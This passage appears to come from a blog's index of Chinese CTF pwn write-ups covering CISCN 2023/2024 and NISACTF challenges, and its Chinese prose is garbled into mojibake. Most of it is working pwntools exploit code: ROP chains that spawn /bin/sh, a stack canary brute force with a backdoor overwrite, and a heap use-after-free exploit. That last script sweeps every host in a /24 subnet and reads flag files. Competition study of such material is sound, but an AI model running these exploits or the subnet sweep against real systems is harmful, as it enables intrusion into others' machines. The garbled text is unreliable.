0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall\n\nå¾ˆå¯æƒœï¼Œè¿™æ®µ ropchain è¿˜æ˜¯å¤ªé•¿äº†ï¼Œè¿˜éœ€è¦ç¼©çŸ­ï¼Œæœ€åç»“æœ exp å¦‚ä¸‹\nfrom ctypes import *from pwn import *#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28324)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;./easy_pwn&#x27;)from struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += p64(59)p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscallep = b&#x27;&#x27;for i in range(len(p)):        ep += p8(ord(p[i:i+1]) ^ 0x66)    payload = b&#x27;a&#x27;*0x50 + epio.sendafter(b&#x27;Password: \\n&#x27;, payload)io.interactive()\n\n[CISCN 2023 åå—] çƒ§çƒ¤æ‘Šå„¿é¢˜ç›®è¯´æ˜æ•´æ•°æº¢å‡ºæŠŠæ‘Šä¹°ä¸‹æ¥ï¼Œæ”¹åå„¿çš„æ—¶å€™å­˜åœ¨æº¢å‡ºï¼Œé™æ€é“¾æ¥ç”¨ ROPgadget ç”Ÿæˆ ropchain\nè§£é¢˜æ€è·¯from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./shaokao&#x27;)#io = process(&#x27;./shaokao&#x27;)io = remote(&#x27;39.106.71.184&#x27;,34604)def sla(a,b):    io.sendlineafter(a,b)def buy():    sla(&quot;&gt; &quot;,&quot;1&quot;)    sla(&quot;3. å‹‡é—¯å¤©æ¶¯&quot;,&quot;1&quot;)    sla(&quot;æ¥å‡ ç“¶ï¼Ÿ&quot;,&quot;-114514&quot;)def cancan():    sla(&quot;&gt; &quot;,&quot;3&quot;)def vip():    sla(&quot;&gt; &quot;,&quot;4&quot;)def play(data):    sla(&quot;&gt; &quot;,&quot;5&quot;)    sla(&quot;çƒ§çƒ¤æ‘Šå„¿å·²å½’ä½ æ‰€æœ‰ï¼Œè¯·èµåï¼š&quot;,data)cancan()buy()cancan()vip()#ROPgadget --binary shaokao --ropchainfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000458827) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040264f) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # paddingp += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000402404) # syscallpayload = b&#x27;a&#x27;*0x28 + pplay(payload)   io.interactive()\n\n\n[CISCN 2023 åå—]funcanaryé¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯ä¿æŠ¤å…¨å¼€ï¼Œå“äººå§\n\nCancanneed main å‡½æ•°\n\né‡å¤´æˆåœ¨ fork å‡½æ•°ï¼Œæ¯æ¬¡å¾ªç¯å®ƒéƒ½ä¼šå¼€å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼ˆsub_128Aï¼‰ï¼Œå­è¿›ç¨‹ä¸­å­˜åœ¨æº¢å‡ºã€‚ç‰¹åˆ«çš„ï¼Œå­è¿›ç¨‹çš„ canary æ˜¯ä¸å˜çš„ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›ç‰¹æ€§å¯¹ canary åœ°å€è¿›è¡Œçˆ†ç ´\n\nçœ‹æ±‡ç¼–è¿˜æ‰¾åˆ°ä¸ªåé—¨å‡½æ•°ï¼Œæ¯”èµ›æ—¶åªçœ‹åˆ°äº†å­—ç¬¦ä¸²æ²¡æ‰¾åˆ°è¿™ä¸ªåœ°æ–¹\n\nç¨‹åºå¼€å¯äº† PIE ä¿æŠ¤ï¼Œcanary åä¸‰ä½å›ºå®šï¼Œçˆ†ç ´ canary ç¬¬å››ä½åœ°å€å³å¯\nfrom pwn import *context(log_level = &#x27;debug&#x27;)#io = process(&#x27;./funcanary&#x27;)io = remote(&#x27;47.93.249.245&#x27;, &#x27;41984&#x27;)elf = ELF(&#x27;./funcanary&#x27;)io.recvuntil(b&#x27;welcome\\n&#x27;)canary = b&#x27;\\x00&#x27;for k in range(7):    for i in range(256):        payload = b&#x27;A&#x27;*0x68 + canary + p8(i)        io.send(payload)        a = io.recvuntil(b&#x27;welcome\\n&#x27;)        if b&#x27;have fun&#x27; in a:            canary += p8(i)            print(canary)            break            #print(b&#x27;canary:&#x27; + canary)        print(k, canary)print(canary)io.interactive()# 0x1324backdoor = 0x1229context(log_level =&#x27;debug&#x27;)for m in range(16):    tmp = m * 16 + 2    payload = b&#x27;A&#x27;*0x68 + canary + b&#x27;deadbeef&#x27; + b&#x27;\\x31&#x27; + p8(tmp)    io.send(payload)    a = io.recvline()    print(a)    if b&#x27;flag&#x27; in a:        io.interactive()    print(&#x27;m = &#x27; + str(m))    print(b&#x27;\\x29&#x27; + str(tmp).encode())    #try:        #a = rcvuntil(b&#x27;flag&#x27;)        #io.interactive()    #except:        #passio.interactive()\n\næœ€åéƒ½æ²¡æ‰“é€šï¼Œçœ‹ wp è¯´æ˜¯è¦å°è¯•å¤šæ¬¡ï¼Œç­‰å¤ç°ç¯å¢ƒä¸Šçº¿å†çœ‹çœ‹\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io =remote(&#x27;node1.anna.nssctf.cn&#x27;,28422)elf = ELF(&quot;./funcanary&quot;)#libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;welcome&quot;)canary = b&#x27;\\x00&#x27;for j in range(7):    for i in range(0x100):        io.send(cyclic(0x68) + canary +  i.to_bytes(1,&#x27;little&#x27;))        a = io.recvuntil(&#x27;welcome\\n&#x27;)        if b&#x27;have fun&#x27; in a:            canary += i.to_bytes(1,&#x27;little&#x27;)            breakpayload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x02&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x12&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x22&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x32&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x42&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x52&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x62&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x72&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x82&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x92&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xa2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xb2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xc2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xd2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xe2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xf2&#x27;io.send(payload)io.interactive()\n\nè¿™ä¸ªèƒ½æ‰“é€š\n","tags":["wp"]},{"title":"ciscn2024åå—èµ›åŒºçº¿ä¸‹","url":"/2024/06/10/ciscn2024%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B/","content":"æ”¯æŒç»¿ç›Ÿ.jpg\nå…ˆåæ§½pwné¢˜çš„é¶æœº\nå¼€å±€ä¿®å¥½äº†æ–‡ä»¶ï¼Œå‘ç°winscpä¼ ä¸œè¥¿ä¼ ä¸ä¸Šå»(æ²¡æƒé™)ï¼Œé—®è£åˆ¤å’‹å›äº‹ï¼Œè£åˆ¤è¯´è¿™æ˜¯é˜²æ­¢å¯¹é¢æ‰“è¿›æ¥åˆ flagåˆ åº“ï¼ŒæŠŠmy_heapå’Œflag.txtéƒ½è®¾ç½®æˆrootæƒé™äº†\nï¼Ÿè¿™æˆ‘å’‹ä¿®ï¼Ÿ\nå¤§æ¦‚å·®ä¸å¤šåä¸€ç‚¹ï¼Œå› ä¸ºæˆ‘winscpä¸€ç›´è¿ç€ï¼Œè¿™ä¸ªç‚¹èƒ½ä¼ æ–‡ä»¶äº†ï¼Œä½†æ˜¯sshåˆè¢«banäº†ï¼Œchmod +x æƒ³éƒ½åˆ«æƒ³\nå°±è·Ÿé¶æœºç©äº†ä¸€ä¸Šåˆï¼Œåƒå®Œä¸­é¥­1ç‚¹é’Ÿæ‰æ­£å¼å¼€æ‰“aï¼ˆå¯¹ï¼Œå› ä¸ºæƒé™é—®é¢˜è§£å†³ä¸äº†å°±æ²¡æœ‰wdäº†)ï¼‰\nç¬¬ä¸€æ¬¡çº¿ä¸‹èµ›ä¸»åŠæ–¹å…ˆé€ä¸­é¥­å†å¼€æ‰“çš„\nä¸‹åˆé€äº†æ¯ç‘å¹¸è¿˜æ˜¯ä¸é”™çš„ï¼‰\næ¥çœ‹é¢˜[ciscn2024 åå—pwn1]ä¿æŠ¤å…¨å¼€2.34çš„libcæ¼æ´ç‚¹å­˜åœ¨backdoor\naddæ²¡æœ‰å¯¹å¤§å°è¿›è¡Œé™åˆ¶,ä½†æ˜¯åªèƒ½æ“ä½œä¸€ä¸ªchunk\ndeleteå­˜åœ¨UAF\neditä»…æœ‰0x8ï¼Œä½†æ˜¯æœ‰ä¸€æ¬¡magicï¼Œå¯ä»¥æ³„éœ²backdooråœ°å€ä»¥åŠedit0x10(å¯ä»¥è¶Šç•Œ)\nshowä¼šå¯¹è¾“å‡ºè¿›è¡Œä¸€æ®µâ€œåŠ å¯†â€ï¼Œé€†ä¸€ä¸‹å°±å¥½\noutput=b&quot;&quot;while len(libcbase)&lt;6:    output+=p8((u8(p.recv(1))^(len(libcbase)+153)))\n\nfixsystemç›´æ¥æ”¹æˆputsã€‚(çœ‹å¹³å°ï¼Œè¿™ä¸ªå¯èƒ½checkä¸è¿‡ï¼Œé˜Ÿå‹ç›´æ¥æŠŠè¿™ä¸ªbackdoorç»™nopæ‰äº†)\naddæ²¡ä¿®\ndeleteçš„UAFä¿®æ³•ï¼šå…ˆæŠŠeh_frameæ®µçš„flagæ”¹ä¸º7ï¼Œä½¿å…¶å¯æ‰§è¡Œï¼Œåœ¨ä¸Šé¢åˆ©ç”¨keypatchå†™ä¸‹ä»¥ä¸‹ä»£ç \ncall 0x10E0 ;call free@pltpush    rbpmov     rbp, rspmov     rax, cs:bufmov     rdi, rax;get chunk_ptr        xor r8,r8push r8pop raxmov cs:buf,raxnopjmp 0x13BD;è·³å›main\n\nå†æŠŠåŸæ¥çš„freeæ”¹ä¸ºjmpåˆ°è‡ªå·±å†™çš„ä»£ç ä¸Šå³å¯\nbreakæ²¡æœ‰æ§åˆ¶å¤§å°å’ŒUAFï¼Œåˆ©ç”¨unsortedbinå¯ä»¥æ³„éœ²libcåœ°å€ç„¶åå¯ä»¥æ”¹strlenä¸ºbackdoor\nfrom pwn import *from pwn import p64,u64,p8,u8#p = remote(&quot;172.16.75.105&quot;,)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#context.log_level=&#x27;debug&#x27;libc = ELF(&#x27;libc.so.6&#x27;)#p = (&quot;172.16.75.105&quot;,9999)#p = process(&quot;my_heap&quot;)#for i in range(0,6):    #add(i,0x40)def cmd(choice):    p.recvuntil(&quot;edit&quot;)    p.sendline(str(choice))def add(size):    cmd(1)    p.recvuntil(&quot;which one you choose?&quot;)    p.sendline(str(1))    p.recvuntil(&quot;size:&quot;)    p.sendline(str(size))def add_1():    cmd(1)    p.recvuntil(&quot;which one you choose?&quot;)    p.sendline(str(2))def delete():    cmd(2)def show():    cmd(3)def edit(content):    cmd(4)    p.recvuntil(&quot;edit data:&quot;)    p.send(content)def exp():    add(0x430)    add_1()    delete()    add_1()    show()    p.recvuntil(&quot;the data:&quot;)    libcbase=b&quot;&quot;    while len(libcbase)&lt;6:        libcbase+=p8((u8(p.recv(1))^(len(libcbase)+153)))    libcbase=u64(libcbase.ljust(8,b&#x27;\\x00&#x27;))-0x21b0e0    success(&quot;libcbase: %s&quot;,hex(libcbase))    strlen_got=libcbase+libc.got[&#x27;strlen&#x27;]    add(0x70)    delete()    show()    p.recvuntil(&quot;the data:&quot;)    key=b&quot;&quot;    while len(key)&lt;6:        key+=p8((u8(p.recv(1))^(len(key)+153)))    key=u64(key.ljust(8,b&#x27;\\x00&#x27;))    heapbase=key&lt;&lt;12    success(&quot;heapbase: %s&quot;,hex(heapbase))    tcache=heapbase+0xc0    addr=heapbase+0x290    success(&quot;addr: %s&quot;,hex(addr))    success(&quot;tcache: %s&quot;,hex(tcache))    cmd(5)    p.recvuntil(&quot;0x&quot;)    backdoor=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))    base=backdoor-0x12be    buf=base+0x0000000000004040    success(&quot;backdoor: %s&quot;,hex(backdoor))    success(&quot;base: %s&quot;,hex(base))    p.recvuntil(&quot;edit data:&quot;)    p.send(p64(0)*2)    delete()    edit(p64(buf^key))    add(0x70)    add(0x70)    edit(p64(strlen_got))    edit(p64(backdoor))    p.sendline(&quot;cat flag.txt&quot;)for i in range(0,255):    global ip,p    ip = &#x27;172.16.75.&#123;i&#125;&#x27;    p = (ip,9999)    exp()\n","tags":["wp"]},{"title":"UAF","url":"/2023/08/24/UAF/","content":"ç›´æ¥ä¸Šä¾‹é¢˜[NISACTF 2022]UAFchecksecï¼Œæ³¨æ„ä¸€ä¸‹æ˜¯32ä½\nstr1k3@ubuntu:~/Desktop$ checksec &#x27;/var/run/vmblock-fuse/blockdir/FsiUbs/UAF&#x27; [*] &#x27;/var/run/vmblock-fuse/blockdir/FsiUbs/UAF&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled\nå…ˆçœ‹mainå‡½æ•°\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.create&quot;);      puts(&quot;2.edit&quot;);      puts(&quot;3.delete&quot;);      puts(&quot;4.show&quot;);      putchar(58);      __isoc99_scanf(&quot;%d&quot;, v3);      if ( v3[0] != 2 )        break;      edit();    &#125;    if ( v3[0] &gt; 2 )    &#123;      if ( v3[0] == 3 )      &#123;        del();      &#125;      else if ( v3[0] == 4 )      &#123;        show();      &#125;      else      &#123;LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3[0] != 1 )        goto LABEL_13;      create();    &#125;  &#125;&#125;\nå¾ˆæ ‡å‡†çš„èœå•é¢˜ï¼Œè·Ÿè¿›æ¯ä¸ªå‡½æ•°çœ‹çœ‹\nint create()&#123;  int result; // eax  int v1; // ebx  char *v2; // eax  printf(&quot;you are creating the %d page\\n&quot;, i);  result = i;  if ( i &gt;= 0 ) //é‡è¦  &#123;    result = i;    if ( i &lt;= 9 )    &#123;      v1 = i;      (&amp;page)[v1] = (char 